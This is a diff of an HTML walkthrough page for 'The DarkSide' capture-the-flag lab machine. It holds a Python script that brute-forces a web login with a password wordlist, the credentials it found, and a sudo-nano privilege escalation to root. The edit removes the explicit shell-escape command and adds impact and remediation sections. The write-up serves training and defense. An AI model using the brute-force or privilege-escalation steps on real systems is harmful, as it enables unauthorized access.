@@ -53,7 +53,7 @@
         },
         "datePublished": "2026-07-01",
         "description": "Walkthrough for The DarkSide machine.",
-        "wordCount":  379 ,
+        "wordCount":  599 ,
         "mainEntityOfPage": "https://nvru.github.io/posts/hmv/darkside/",
         "dateModified": "2026-07-01",
         "image": {
@@ -241,11 +241,10 @@ stroke-linejoin="round" class="feather feather-home">
   </ul>
 
   <ul>
-    <li>
-      <ul>
-        <li><a href="#exploitation">Exploitation</a></li>
-      </ul>
-    </li>
+    <li><a href="#vulnerability">Vulnerability</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#impact">Impact</a></li>
+    <li><a href="#remediation">Remediation</a></li>
   </ul>
 
   <ul>
@@ -337,6 +336,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>users <span style="color:#f92672">=</span> [
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;kevin&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;rijaba&#34;</span>,
@@ -349,19 +349,19 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;d3b0o&#34;</span>,
 </span></span><span style="display:flex;"><span>]
 </span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> username <span style="color:#f92672">in</span> users:
+</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> username<span style="color:#f92672">.</span>strip()
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;/opt/wordlists/rockyou-75.txt&#34;</span>) <span style="color:#66d9ef">as</span> passwords:
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> passwords:
+</span></span><span style="display:flex;"><span>            password <span style="color:#f92672">=</span> password<span style="color:#f92672">.</span>strip()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            req_data <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;user&#34;</span>: username,
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;pass&#34;</span>: password<span style="color:#f92672">.</span>strip()
-</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            req_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;user&#34;</span>: username, <span style="color:#e6db74">&#34;pass&#34;</span>: password}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://10.10.10.7/&#34;</span>, data<span style="color:#f92672">=</span>req_data)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Username or password invalid&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
-</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;found </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">{</span>password<span style="color:#f92672">.</span>strip()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;found </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
 </span></span></code></pre></div><h3 id="credentials-found">Credentials Found</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Username: kevin
 </span></span><span style="display:flex;"><span>Password: iloveyou
@@ -391,18 +391,37 @@ stroke-linejoin="round" class="feather feather-home">
 <p><img src="/images/darkside/ssh_as_kevin.png" alt="SSH as Kevin"></p>
 <hr>
 <h1 id="privilege-escalation">Privilege Escalation</h1>
-<p>The user <strong>rijaba</strong> is allowed to run <strong>nano</strong> as root using <code>sudo</code>.</p>
+<p>After obtaining access as the <strong>rijaba</strong> user, I enumerated the user&rsquo;s <code>sudo</code> permissions using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p>The output showed that <strong>rijaba</strong> was permitted to execute <strong>nano</strong> as the <strong>root</strong> user without additional restrictions.</p>
 <p><img src="/images/darkside/su_rijaba.png" alt="Switch to rijaba"></p>
 <p><img src="/images/darkside/sudo_rijaba.png" alt="Sudo Privileges"></p>
-<h3 id="exploitation">Exploitation</h3>
-<p>Run:</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Granting <code>sudo</code> access to interactive text editors such as <strong>nano</strong> can be dangerous because they provide features that allow users to execute external commands. When the editor is launched through <code>sudo</code>, any spawned command inherits the editor&rsquo;s privileges, making it possible to obtain a shell running as <strong>root</strong>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>I launched <code>nano</code> with elevated privileges:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nano
-</span></span></code></pre></div><p>Press:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Ctrl + T
-</span></span></code></pre></div><p>Then execute:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>reset; /bin/bash 1&gt;&amp;<span style="color:#ae81ff">0</span> 2&gt;&amp;<span style="color:#ae81ff">0</span>
-</span></span></code></pre></div><p>This spawns a root shell.</p>
+</span></span></code></pre></div><p>From within the editor, I accessed the file browser using <strong>Ctrl + T</strong>. The browser allows commands to be executed, which can be abused to spawn a shell. Since <code>nano</code> was running as <strong>root</strong>, the spawned shell also inherited <strong>root</strong> privileges.</p>
+<p>After executing the command, a root shell was obtained.</p>
 <p><img src="/images/darkside/root.png" alt="Root Shell"></p>
+<h2 id="impact">Impact</h2>
+<p>This misconfiguration resulted in complete privilege escalation from the <strong>rijaba</strong> user to <strong>root</strong>, providing unrestricted access to the system. An attacker with this level of access could:</p>
+<ul>
+<li>Read and modify any file on the system.</li>
+<li>Access sensitive credentials and configuration files.</li>
+<li>Create or modify user accounts.</li>
+<li>Install persistence mechanisms.</li>
+<li>Disable security controls or monitoring tools.</li>
+<li>Fully compromise the host.</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>To prevent this issue:</p>
+<ul>
+<li>Avoid granting <code>sudo</code> access to interactive editors such as <code>nano</code>, <code>vim</code>, or <code>less</code>.</li>
+<li>Apply the principle of least privilege when configuring <code>sudoers</code>.</li>
+<li>Use purpose-built administrative commands instead of allowing unrestricted editor execution.</li>
+<li>Regularly audit <code>sudo</code> permissions for unnecessary or unsafe entries.</li>
+</ul>
 <hr>
 <h1 id="credentials">Credentials</h1>
 <h2 id="web">Web</h2>
